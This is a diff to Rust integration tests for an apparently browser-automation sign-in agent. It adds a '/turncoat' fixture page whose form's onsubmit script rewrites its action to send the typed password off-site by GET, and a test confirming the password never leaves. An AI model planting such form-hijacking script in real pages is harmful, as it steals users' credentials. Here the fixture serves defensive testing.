@@ -18,8 +18,14 @@ const PASSWORD: &str = "hunter2-canary-w3";
 const SEED: &str = "JBSWY3DPEHPK3PXP";
 
 fn have_chromium() -> bool {
-    std::env::var_os("PATH")
-        .is_some_and(|path| std::env::split_paths(&path).any(|dir| dir.join("chromium").is_file()))
+    let found = std::env::var_os("PATH")
+        .is_some_and(|path| std::env::split_paths(&path).any(|dir| dir.join("chromium").is_file()));
+    // The checks image has one: there a skip would hide a broken guarantee.
+    assert!(
+        found || std::env::var_os("HOTLINE_TESTS_NEED_CHROMIUM").is_none(),
+        "HOTLINE_TESTS_NEED_CHROMIUM is set and no chromium is on PATH"
+    );
+    found
 }
 
 /// The links the general browser was asked to open.
@@ -125,6 +131,9 @@ async fn site(off_site: u16) -> u16 {
                         .catch(e => document.getElementById('r').textContent = 'refused ' + e.name + ' ' + e.message);</script>"#.to_owned()),
                     "/leaky" => ("200 OK", String::new(), format!(r#"<title>Leaky</title>
                         <form action="http://127.0.0.1:{off_site}/form" method="get"><label>Password <input name="p" type="password"></label><button>Sign in</button></form>"#)),
+                    "/turncoat" => ("200 OK", String::new(), format!(r#"<title>Turncoat</title>
+                        <form action="/totp" method="post" onsubmit="this.action='http://127.0.0.1:{off_site}/form'; this.method='get'">
+                        <label>Password <input name="p" type="password"></label><button>Sign in</button></form>"#)),
                     "/files" => ("200 OK", String::new(), r#"<title>Files</title><a href="/report.csv">Report</a>"#.to_owned()),
                     "/report.csv" => ("200 OK\r\nContent-Disposition: attachment; filename=\"report.csv\"", String::new(), "a,b\n1,2\n".to_owned()),
                     "/whoami" => ("200 OK", String::new(), format!("<title>Who</title><p>cookies: [{cookie}]</p>")),
@@ -189,6 +198,9 @@ async fn rig(logins: Value) -> Rig {
         set.insert(name.clone(), serde_json::from_value(login).unwrap());
     }
     app.secrets.replace(set).unwrap();
+    // As `PUT /secrets` does after each delivery: what is granted now is
+    // what a later delivery's revocations are told apart from.
+    signin.notice_revocations().await;
     Rig {
         app,
         signin,
@@ -523,6 +535,7 @@ async fn revoking_a_login_signs_its_site_out() {
         .await
         .unwrap();
     rig.app.secrets.replace(BTreeMap::new()).unwrap();
+    rig.signin.notice_revocations().await;
     for _ in 0..40 {
         if rig.signin.tab_list().is_empty() {
             break;
@@ -957,13 +970,58 @@ async fn a_password_sent_off_the_site_never_leaves() {
         .await
         .unwrap_err();
     assert!(refused.contains("sends by GET"), "{refused}");
+    // Sent empty, it is a plain link elsewhere: it opens in the general
+    // browser, carrying nothing.
     rig.browser(json!({"action": "click_ref", "ref": button}))
         .await
         .unwrap();
     tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    let opened = rig.general.0.lock().unwrap().clone();
+    assert!(
+        opened.iter().all(|url| url.ends_with("/form?p=")),
+        "only the empty form went to the general browser: {opened:?}"
+    );
+    // Typed into its own site's form, which the page then sends elsewhere
+    // by GET: the load is stopped, and no server or browser gets it.
+    rig.general.0.lock().unwrap().clear();
+    rig.browser(json!({"action": "navigate", "url": rig.url("/turncoat")}))
+        .await
+        .unwrap();
+    let password = rig.find("Password").await;
+    let button = rig.find("[button] Sign in").await;
+    rig.browser(json!({"action": "fill", "ref": password, "secret": "SITE.password"}))
+        .await
+        .unwrap();
+    rig.browser(json!({"action": "click_ref", "ref": button}))
+        .await
+        .unwrap();
+    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    // Neither sent on to its own /totp (the code page) nor anywhere else:
+    // the tab still shows the sign-in page.
+    let running = rig.signin.browser().await.unwrap();
+    let session = rig.signin.lock_tabs().list[0].session.clone();
+    let history = running
+        .cdp
+        .on(&session, "Page.getNavigationHistory", json!({}))
+        .await
+        .unwrap();
+    let index = history["currentIndex"].as_u64().unwrap() as usize;
+    assert!(
+        history["entries"][index]["url"]
+            .as_str()
+            .unwrap()
+            .ends_with("/turncoat"),
+        "the sign-in page stays: {history}"
+    );
+    assert!(!history.to_string().contains(PASSWORD), "{history}");
     assert!(
         rig.general.0.lock().unwrap().is_empty(),
         "nothing went to the general browser"
+    );
+    let heard = HEARD.lock().unwrap().clone();
+    assert!(
+        heard.iter().all(|line| !line.contains(PASSWORD)),
+        "a server heard the password: {heard:?}"
     );
     rig.signin.stop().await;
 }
